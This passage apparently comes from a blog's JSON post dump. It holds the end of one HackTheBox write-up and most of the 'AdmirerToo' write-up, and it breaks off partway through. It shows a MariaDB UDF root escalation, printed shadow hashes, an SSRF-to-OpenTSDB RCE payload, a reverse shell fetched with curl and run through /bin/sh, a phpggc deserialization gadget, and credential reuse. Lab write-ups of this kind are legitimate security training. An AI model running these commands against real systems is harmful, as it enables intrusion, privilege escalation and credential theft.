MariaDB [mysql]&gt; show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name   | Value                                       | +-----------------+---------------------------------------------+ | plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma                                       | +-----------------+---------------------------------------------+ 2 rows in set (0.001 sec)  MariaDB [mysql]&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; Query OK, 1 row affected (0.001 sec)  MariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so'; Query OK, 0 rows affected (0.001 sec)  MariaDB [mysql]&gt; select * from mysql.func; +-----------+-----+----------------+----------+ | name      | ret | dl             | type     | +-----------+-----+----------------+----------+ | do_system |   2 | raptor_udf2.so | function | +-----------+-----+----------------+----------+ 1 row in set (0.000 sec)  MariaDB [mysql]&gt; select do_system('echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd'); +---------------------------------------------------------------------------------+ | do_system('echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd') | +---------------------------------------------------------------------------------+ |                                                                               0 | +---------------------------------------------------------------------------------+ 1 row in set (0.002 sec)  MariaDB [mysql]&gt; \\!sh ERROR: Usage: \\! shell-command MariaDB [mysql]&gt; \\! sh $ su root2 Password: root@noter:/dev/shm/exploit## hostname; id; cat /root/root.txt; ip a noter uid=0(root) gid=0(root) groups=0(root) f6cf8b4b2c9af103636f9685571917aa 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:50:56:b9:49:2b brd ff:ff:ff:ff:ff:ff     inet 10.10.11.160/23 brd 10.10.11.255 scope global eth0        valid_lft forever preferred_lft forever     inet6 dead:beef::250:56ff:feb9:492b/64 scope global dynamic mngtmpaddr        valid_lft 86399sec preferred_lft 14399sec     inet6 fe80::250:56ff:feb9:492b/64 scope link        valid_lft forever preferred_lft forever     Trophy    User.txt  c20d842d8d4ce26f46f247128817290d  Root.txt  f6cf8b4b2c9af103636f9685571917aa  /etc/shadow  root@noter:/dev/shm/exploit## cat /etc/shadow | grep '\\$' root:$6$09RSjU3jIh/2JW1u$8jlcYzW5Oyzgh/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7::: svc:$6$gTM.AIsgDue4r5AQ$wUBfUtg7/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7::: ftp_admin:$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7::: blue:$6$pNud9u/1PdD8qPYi$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO/hIiUQdVTqlxb29.:19114:0:99999:7:::"
  },
  
  {
    "title": "HackTheBox - AdmirerToo",
    "url": "/posts/admirertoo/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox, deserialization",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Resolution summary     Web server enumeration allows to identify admirer-gallery.htb and subdomain enumeration allows to identify db.admirer-gallery.htb   db.admirer-gallery.htb is vulnerable to Server Side Request Forgery (CVE-2021-21311) and allows to scan and retrieve information from internal services, including OpenTSDB running on port 4242   OpenTSDB 2.4.0 is vulnerable to Remote Code Execution (CVE-2020-35476) but PoC does not work as it is, so further enumeration through service API is required to make it work and obtain a shell as opentsdb   Local enumeration reveals old MySQL credentials inside a configuration file that can be reused to escalate to jennifer   Local service enumeration reveals a local port 8080 that can be forwarded remotely using ssh and runs a version of OpenCats vulnerable to PHP Object Injection (CVE-2021-25294)   Local enumeration reveals other MySQL credentials that can be used to access opencats DB   Opencat login form cannot be bypassed and admin‚Äôs credentials extracted from the user table cannot be cracked, however cats user has full grants on cats_dev DB, allowing to overwrite admin credentials and login.   Local enuemration reveals that fail2ban is installed on the machine and is vulnerable to Remote Code Execution (CVE-2021-32749)   PHP Code Injection and fail2ban Remote Code Execution can be chained together in order to write an arbitrary whois.conf and trick the server into using our machine as whois server. Once contacted, a script can be sent able to trigger the RCE in fail2ban during the sending of the notification emails.   Improved skills     Exploit SSRF to enumerate and attack internal servers   Chain multiple vulnerabilities   Used tools     nmap   gobuster   Public PoC   ssh (port forwarding)   phpggc   nc     Information Gathering  Scanned all TCP ports:  $ sudo nmap -p- admirertoo.htb -sS -oN scan/all-tcp-ports.txt -v PORT      STATE    SERVICE 22/tcp    open     ssh 80/tcp    open     http 4242/tcp  filtered vrml-multi-use 16010/tcp filtered unknown 16030/tcp filtered unknown   Enumerated open TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ sudo nmap -p22,80,4242,16010,16030 admirertoo.htb -sT -sV -sC -oN scan/open-tcp-ports.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 11:01 EDT Nmap scan report for admirertoo.htb (10.10.11.137) Host is up (0.036s latency).  PORT      STATE    SERVICE        VERSION 22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey:  |   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA) |   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA) |_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519) 80/tcp    open     http           Apache httpd 2.4.38 ((Debian)) |_http-title: Admirer |_http-server-header: Apache/2.4.38 (Debian) 4242/tcp  closed   vrml-multi-use 16010/tcp filtered unknown 16030/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.78 seconds   Enumeration  Port 80 - HTTP (Apache httpd 2.4.38 ((Debian)))    Enumerated files and directories:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ gobuster dir -u http://admirertoo.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 25 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url:                     http://admirertoo.htb/ [+] Method:                  GET [+] Threads:                 25 [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt [+] Negative Status codes:   404 [+] User Agent:              gobuster/3.1.0 [+] Timeout:                 10s =============================================================== 2022/04/23 11:07:19 Starting gobuster in directory enumeration mode =============================================================== /css                  (Status: 301) [Size: 365] [--&gt; http://admirertoo.htb/css/] /js                   (Status: 301) [Size: 364] [--&gt; http://admirertoo.htb/js/]  /img                  (Status: 301) [Size: 365] [--&gt; http://admirertoo.htb/img/] /fonts                (Status: 301) [Size: 367] [--&gt; http://admirertoo.htb/fonts/] /manual               (Status: 301) [Size: 368] [--&gt; http://admirertoo.htb/manual/]   Discovered DNS admirer-gallery.htb:    VHOST enumeration:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ gobuster vhost -u admirer-gallery.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url:          http://admirer-gallery.htb [+] Method:       GET [+] Threads:      10 [+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt [+] User Agent:   gobuster/3.1.0 [+] Timeout:      10s =============================================================== 2022/04/23 11:18:02 Starting gobuster in VHOST enumeration mode =============================================================== Found: db.admirer-gallery.htb (Status: 200) [Size: 2569]   db.admirer-gallery.htb (Adminer 4.7.8)      Enumerated MySQL version:    Enumerated user credentials:     üîë admirer_ro     *8CE6ACD7FC9ABDE377FF1CE332CE1D790E167086    Found user credentials cached within the login page:     üîë admirer_ro     1w4nn4b3adm1r3d2!    Exploitation  Adminer 4.7.8 Server Side Request Forgery - CVE-2021-21311  NVD  Commit that partially resolved the vulnerability:  https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351  Because SSRF is still present but responses cannot be viewed if not with response code 200, we can force a 301 Redirect in order to read server response.  Python script to accept requests on port 80 and redirect them to an arbitrary host with a 301:  Python script to accept requests on port 80 and redirect them to an arbitrary host with a 301  $ sudo python3 redirect.py 10099 http://10.10.11.137   Connection to the attacker server using Elasticsearch module:    Used the ‚Äúunhide‚Äù feature from burpsuite    OpenTSDB 2.4.0 Remote Code Execution - CVE-2020-35476  Enumerated internal port 4242:  $ sudo python3 redirect.py 10099 http://10.10.11.137:4242/     OpenTSDB  Enumerated OpenTSDB version:  /api/version  $ sudo python2 redirect.py --port 10099 http://10.10.11.137:4242/api/version   {\"short_revision\":\"14ab3ef\",\"repo\":\"/home/hobbes/OFFICIAL/build\",\"host\":\"clhbase\",\"version\":\"2.4.0\",\"full_revision\":\"14ab3ef8a865816cf920aa69f2e019b7261a7847\",\"repo_status\":\"MINT\",\"user\":\"hobbes\",\"branch\":\"master\",\"timestamp\":\"1545014415\"}   Known vulnerability for OpenTSDB 2.4.0:  OpenTSDB - A Distributed, Scalable Monitoring System                 [Arbitrary Code Execution in net.opentsdb:opentsdb       CVE-2020-35476       Snyk](https://security.snyk.io/vuln/SNYK-JAVA-NETOPENTSDB-1041751)           Exploited the SSRF to trigger the RCE on port 4242:    $ python2 redirect.py --port 10098 \"http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system('touch/tmp/poc.txt')]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json\" serving at port 10098 10.10.11.137 - - [24/Apr/2022 14:43:52] \"GET / HTTP/1.0\" 301 - 10.10.11.137 - - [24/Apr/2022 14:43:52] \"GET / HTTP/1.0\" 301 -     No such name for ‚Äòmetrics‚Äô: ‚Äòsys.cpu.nice‚Äô  Enumerated available metrics trough API:  OpenTSDB - Get all metrics via http  /api/suggest  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ python2 redirect.py --port 10099 \"http://10.10.11.137:4242/api/suggest?type=metrics\"   [\"http.stats.web.hits\"]   Took the existent PoC and fixed with the available metric:  $ python2 redirect.py --port 10098 'http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(\"touch/tmp/poc.txt\")]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'   {\"plotted\":4,\"timing\":0,\"cachehit\":\"disk\",\"etags\":[[\"host\"]],\"points\":8}   Reverse shell:  rev.sh  /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/10100 0&gt;&amp;1'   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 [sudo] password for kali:  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.137 - - [24/Apr/2022 10:54:50] \"GET / HTTP/1.1\" 200 - 10.10.11.137 - - [24/Apr/2022 10:56:33] \"GET /rev.sh HTTP/1.1\" 200 - 10.10.11.137 - - [24/Apr/2022 10:57:33] \"GET /rev.sh HTTP/1.1\" 200 -   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ python2 redirect.py --port 10099 'http://10.10.11.137:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(\"curl${IFS}http://10.10.14.2/rev.sh|/bin/sh\")]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json' serving at port 10099 10.10.11.137 - - [24/Apr/2022 10:56:33] \"GET / HTTP/1.0\" 301 - 10.10.11.137 - - [24/Apr/2022 10:57:33] \"GET / HTTP/1.0\" 301 -   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ nc -nlvp 10100 listening on [any] 10100 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 43194 bash: cannot set terminal process group (549): Inappropriate ioctl for device bash: no job control in this shell opentsdb@admirertoo:/$ id uid=1000(opentsdb) gid=1000(opentsdb) groups=1000(opentsdb)   Lateral Movement to jennifer  Local enumeration  Enumerated users:  opentsdb@admirertoo:/$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin opentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false hbase:x:1001:1001::/opt/hbase/:/sbin/nologin mysql:x:105:114:MySQL Server,,,:/nonexistent:/bin/false jennifer:x:1002:100::/home/jennifer:/bin/bash sshd:x:106:65534::/run/sshd:/usr/sbin/nologin Debian-exim:x:107:113::/var/spool/exim4:/usr/sbin/nologin devel:x:1003:1003::/home/devel:/sbin/nologin   Enumerated open ports:  opentsdb@admirertoo:/tmp$ netstat -polentau Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          15337      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      105        16191      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          14268      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:39384         127.0.0.1:4242          ESTABLISHED 33         876179     -                    keepalive (5420.82/0/0) tcp        0    187 10.10.11.137:43194      10.10.14.2:10100        ESTABLISHED 1000       1090591    11229/bash           on (0.23/0/0) tcp        0      0 127.0.0.1:39380         127.0.0.1:4242          ESTABLISHED 33         876148     -                    keepalive (5420.82/0/0) tcp        0      0 127.0.0.1:39378         127.0.0.1:4242          ESTABLISHED 33         876635     -                    keepalive (5289.74/0/0) tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      1001       18331      -                    off (0.00/0/0) tcp6       0      0 :::22                   :::*                    LISTEN      0          15339      -                    off (0.00/0/0) tcp6       0      0 :::16030                :::*                    LISTEN      1001       19459      -                    off (0.00/0/0) tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      1001       19448      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      1001       19416      -                    off (0.00/0/0) tcp6       0      0 :::16010                :::*                    LISTEN      1001       18326      -                    off (0.00/0/0) tcp6       0      0 :::80                   :::*                    LISTEN      0          15352      -                    off (0.00/0/0) tcp6       0      0 :::4242                 :::*                    LISTEN      1000       21278      557/java             off (0.00/0/0) tcp6       0      0 127.0.0.1:60916         127.0.1.1:16020         TIME_WAIT   0          0          -                    timewait (47.37/0/0) tcp6       0      0 127.0.0.1:2181          127.0.0.1:45726         ESTABLISHED 1001       18332      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:2181          127.0.0.1:45714         ESTABLISHED 1001       18301      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:4242          127.0.0.1:39384         ESTABLISHED 1000       876860     557/java             keepalive (5420.82/0/0) tcp6       0      0 127.0.1.1:16000         127.0.1.1:44267         ESTABLISHED 1001       20913      -                    keepalive (5682.30/0/0) tcp6       0      0 127.0.0.1:45726         127.0.0.1:2181          ESTABLISHED 1001       19458      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:45742         127.0.0.1:2181          ESTABLISHED 1001       20286      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:2181          127.0.0.1:45742         ESTABLISHED 1001       20915      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:4242          127.0.0.1:39380         ESTABLISHED 1000       876791     557/java             keepalive (5420.82/0/0) tcp6       0      0 127.0.1.1:44267         127.0.1.1:16000         ESTABLISHED 1001       20909      -                    keepalive (5682.30/0/0) tcp6       0      0 127.0.0.1:45714         127.0.0.1:2181          ESTABLISHED 1001       18300      -                    off (0.00/0/0) tcp6       0      0 127.0.0.1:4242          127.0.0.1:39378         ESTABLISHED 1000       876636     557/java             keepalive (5289.74/0/0) udp        0      0 10.10.11.137:40632      1.1.1.1:53              ESTABLISHED 101        1104895    -                    off (0.00/0/0) udp        0      0 10.10.11.137:35291      8.8.8.8:53              ESTABLISHED 101        1105921    -                    off (0.00/0/0)   Found hardcoded credentials:  opentsdb@admirertoo:~$ grep -ri admirer_ro /var/www/adminer/ /var/www/adminer/plugins/data/servers.php:    'username' =&gt; 'admirer_ro', opentsdb@admirertoo:~$ cat /var/www/adminer/plugins/data/servers.php &lt;?php return [   'localhost' =&gt; array( //    'username' =&gt; 'admirer', //    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3', // Read-only account for testing     'username' =&gt; 'admirer_ro',     'pass'     =&gt; '1w4nn4b3adm1r3d2!',     'label'    =&gt; 'MySQL',     'databases' =&gt; array(       'admirer' =&gt; 'Admirer DB',     )   ), ];    üîë admirer     bQ3u7^AxzcB7qAsxE3    Log in as jennifer reusing known passwords:   üîë jennifer     bQ3u7^AxzcB7qAsxE3    opentsdb@admirertoo:~$ su jennifer Password:  jennifer@admirertoo:/usr/share/opentsdb$ id uid=1002(jennifer) gid=100(users) groups=100(users) jennifer@admirertoo:/usr/share/opentsdb$ cat ~/user.txt  c171776485c8d1852be98f88edbba763   Privilege Escalation  Local Enumeration  Port 8080 - HTTP  Forwarded port 8080:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ ssh -L 1337:localhost:8080 jennifer@admirertoo.htb The authenticity of host 'admirertoo.htb (10.10.11.137)' can't be established. ED25519 key fingerprint is SHA256:6GHqCefcB0XKD8lrY40SKb5COmsxVdTiXV4NYplmxbY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'admirertoo.htb' (ED25519) to the list of known hosts. jennifer@admirertoo.htb's password: Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. No mail. Last login: Tue Feb 22 20:58:38 2022 from 10.10.14.8 jennifer@admirertoo:~$     Enumerated configuration file for DB credentials:  jennifer@admirertoo:/opt/opencats$ cat config.php | grep -i database /* Database configuration. */ define('DATABASE_USER', 'cats'); define('DATABASE_PASS', 'adm1r3r0fc4ts'); define('DATABASE_HOST', 'localhost'); define('DATABASE_NAME', 'cats_dev');  * core team. If this setting is enabled, no writing to the database will /* If enabled, the US zipcode database is installed and the user can filter    üîë cats     adm1r3r0fc4ts    Enumerated DB data:  jennifer@admirertoo:/opt/opencats$ mysql -u cats -p Enter password:  Welcome to the MariaDB monitor.  Commands end with ; or \\g. Your MariaDB connection id is 134652 Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.  MariaDB [(none)]&gt; ... MariaDB [cats_dev]&gt; show tables; +--------------------------------------+ | Tables_in_cats_dev                   | +--------------------------------------+ | access_level                         | | activity                             | | activity_type                        | ... | tag                                  | | user                                 | | user_login                           | | word_verification                    | | xml_feed_submits                     | | xml_feeds                            | | zipcodes                             | +--------------------------------------+ 55 rows in set (0.001 sec)  MariaDB [cats_dev]&gt; select user_name,password from user; +----------------+----------------------------------+ | user_name      | password                         | +----------------+----------------------------------+ | admin          | dfa2a420a4e48de6fe481c90e295fe97 | | cats@rootadmin | cantlogin                        | | jennifer       | f59f297aa82171cc860d76c390ce7f3e | +----------------+----------------------------------+ 3 rows in set (0.000 sec)   Enumerated user privileges ni MySQL:  MariaDB [cats_dev]&gt; show grants; +-------------------------------------------------------------------------------------------------------------+ | Grants for cats@localhost                                                                                   | +-------------------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO `cats`@`localhost` IDENTIFIED BY PASSWORD '*6DB7C7C159FC2393785B54064E70FDB137F445B9' | | GRANT ALL PRIVILEGES ON `cats_dev`.* TO `cats`@`localhost`                                                  | +-------------------------------------------------------------------------------------------------------------+ 2 rows in set (0.000 sec)   Updated every password (cracking hashes was not working):  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ echo -n maoutis | md5sum 6f2ae4978075eae54f9491744818d28d  -   MariaDB [cats_dev]&gt; update user set password=\"6f2ae4978075eae54f9491744818d28d\";   Logged in to opencats using self injected credentials:    Enumerated other services  jennifer@admirertoo:/opt/opencats$ systemctl list-units --type=service UNIT                               LOAD   ACTIVE SUB     DESCRIPTION apache2.service                    loaded active running The Apache HTTP Server apache2@opencats.service           loaded active running The Apache HTTP Server apparmor.service                   loaded active exited  Load AppArmor profiles console-setup.service              loaded active exited  Set console font and keymap cron.service                       loaded active running Regular background program processing daemon dbus.service                       loaded active running D-Bus System Message Bus fail2ban.service                   loaded active running Fail2Ban Service getty@tty1.service                 loaded active running Getty on tty1 hbase.service                      loaded active running HBase ifup@eth0.service                  loaded active exited  ifup for eth0 ifupdown-pre.service               loaded active exited  Helper to synchronize boot up for ifupdown keyboard-setup.service             loaded active exited  Set the console keyboard layout kmod-static-nodes.service          loaded active exited  Create list of required static device nodes for the curren mariadb.service                    loaded active running MariaDB 10.3.31 database server networking.service                 loaded active exited  Raise network interfaces nftables.service                   loaded active exited  nftables open-vm-tools.service              loaded active running Service for virtual machines hosted on VMware opentsdb.service                   loaded active running LSB: Starts OpenTSDB TSD php7.3-fpm.service                 loaded active running The PHP 7.3 FastCGI Process Manager rsyslog.service                    loaded active running System Logging Service ssh.service                        loaded active running OpenBSD Secure Shell server systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage systemd-journald.service           loaded active running Journal Service systemd-logind.service             loaded active running Login Service systemd-modules-load.service       loaded active exited  Load Kernel Modules systemd-random-seed.service        loaded active exited  Load/Save Random Seed systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems systemd-sysctl.service             loaded active exited  Apply Kernel Variables systemd-sysusers.service           loaded active exited  Create System Users systemd-timesyncd.service          loaded active running Network Time Synchronization systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories systemd-udev-trigger.service       loaded active exited  udev Coldplug all Devices systemd-udevd.service              loaded active running udev Kernel Device Manager systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown systemd-user-sessions.service      loaded active exited  Permit User Sessions user-runtime-dir@1002.service      loaded active exited  User Runtime Directory /run/user/1002 user@1002.service                  loaded active running User Manager for UID 1002 vgauth.service                     loaded active running Authentication service for virtual machines hosted on VMwa  LOAD   = Reflects whether the unit definition was properly loaded. ACTIVE = The high-level unit activation state, i.e. generalization of SUB. SUB    = The low-level unit activation state, values depend on unit type.  39 loaded units listed. Pass --all to see loaded but inactive units, too. To show all installed unit files use 'systemctl list-unit-files'.   Enumerated fail2ban:  jennifer@admirertoo:/opt/opencats$ fail2ban-server -V Fail2Ban v0.10.2  jennifer@admirertoo:/opt/opencats$ cat /etc/fail2ban/jail.local [DEFAULT] ignoreip = 127.0.0.1 bantime = 60s destemail = root@admirertoo.htb sender = fail2ban@admirertoo.htb sendername = Fail2ban mta = mail action = %(action_mwl)s   OpenCATS PHP Object Injection to Arbitrary File Write - CVE-2021-25294  OpenCATS Version 0.9.5.2  CVE-2021-25294 : OpenCATS through 0.9.5-3 unsafely deserializes index.php?m=activity requests, leading to remote code execution. This occ  OpenCATS PHP Object Injection to Arbitrary File Write  Generated the POP gadget like the PoC does:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ echo 'this is a test' &gt; /tmp/test.txt  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt /tmp/test.txt a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A15%3A%22this+is+a+test%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftest.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D     jennifer@admirertoo:/opt/opencats$ ls -al /dev/shm/test.txt  -rw-r--r-- 1 devel devel 58 Apr 24 20:19 /dev/shm/test.txt jennifer@admirertoo:/opt/opencats$ cat /dev/shm/test.txt  [{\"Expires\":1,\"Discard\":false,\"Value\":\"this is a test\\n\"}]   Enumerated devel group writable directories:  jennifer@admirertoo:~/test$ find / -group devel 2&gt;/dev/null /opt/opencats/INSTALL_BLOCK /usr/local/src /usr/local/etc jennifer@admirertoo:/tmp$ ls -al /usr/local/src/                                                                                                                                                                                             total 8                                                                                                                                                                                                                                      drwxrwxr-x  2 root devel 4096 Jul  7  2021 .                                                                                                                                                                                                 drwxr-xr-x 10 root root  4096 Jul  7  2021 ..   RCE vulnerability in mailing action using mailutils (mail-whois)  Build software better, together     Command¬†mail¬†from mailutils package used in mail actions like¬†mail-whois¬†can execute command if unescaped sequences (\\n~) are available in ‚Äúforeign‚Äù input (for instance in whois output). [‚Ä¶] The ‚Äò~!‚Äô escape executes specified command and returns you to mail compose mode without altering your message. When used without arguments, it starts your login shell. The ‚Äò~|‚Äô escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message. [‚Ä¶] Which menas that as long as attacker can control stdin that goes to mail (from mailutils package) command - code execution could be achieved.  Then - the interesting configuration file from fail2ban perspective is /etc/fail2ban/action.d/mail-whois.conf fragment: [‚Ä¶] This strictly puts whois command output of banned IP address into email. So if attacker could **get control over whois output of his own IP address - code execution could be achieved (with root, which is more fun of course).    jennifer@admirertoo:/opt/opencats$ cat /etc/fail2ban/action.d/mail-whois.conf ... actionban = printf %%b \"Hi,\\n             The IP &lt;ip&gt; has just been banned 